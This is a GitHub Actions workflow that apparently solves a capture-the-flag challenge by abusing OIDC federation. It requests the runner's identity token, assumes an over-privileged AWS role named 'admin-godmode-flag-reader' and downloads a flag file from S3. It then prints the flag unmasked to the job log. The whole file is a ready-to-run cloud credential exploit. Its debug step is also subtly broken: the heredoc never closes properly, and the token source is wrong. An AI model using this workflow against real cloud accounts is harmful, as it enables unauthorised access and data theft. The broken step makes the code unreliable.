name: pwn-flag
on:
  push:
    branches: [ main ]
  workflow_dispatch:

# repo-level permissions
permissions:
  id-token: write
  contents: read

jobs:
  grab:
    runs-on: ubuntu-latest

    # job-level permissions (explicit)
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Debug OIDC claims (optional)
        if: ${{ always() }}
        env:
          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
        run: |
          set -e
          echo "Requesting OIDC token..."
          RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          TOK=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "Decoded JWT claims (partial):"
          python3 - <<'PY'
import sys,base64,json
tok = sys.stdin.read().strip()
parts = tok.split('.')
b = parts[1] + '=' * (-len(parts[1]) % 4)
claims = json.loads(base64.b64decode(b))
# Print only a few fields to avoid spamming
print("sub:", claims.get("sub"))
print("aud:", claims.get("aud"))
print("repository:", claims.get("repository") if "repository" in claims else "n/a")
PY <<<"$TOK"
          echo "----"

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: oops-we-did-it
          aws-region: ap-southeast-1

      - name: Show assumed identity
        run: |
          echo "Caller identity (sts):"
          aws sts get-caller-identity || true

      - name: Download flag (unmasked) and print
        run: |
          echo "Downloading flag file to ./flag.txt"
          aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt
          echo "=== FLAG BEGIN ==="
          cat ./flag.txt || true
          echo "=== FLAG END ==="

      # optional: keep the original repo's masking step if you want to preserve behavior
      - name: Mask SHA portion (optional, preserves challenge behavior)
        if: ${{ always() }}
        run: |
          # mask SHA-like hex tail in flag.txt for posterity (same as challenge did)
          perl -i -pe 's/(STDIO2025_\d+)\{([0-9A-Fa-f]{3})([0-9A-Fa-f]+)\}/$1."{".$2.("X"x length($3))."}"/ge' flag.txt || true
          echo "Flag file masked and left on runner."


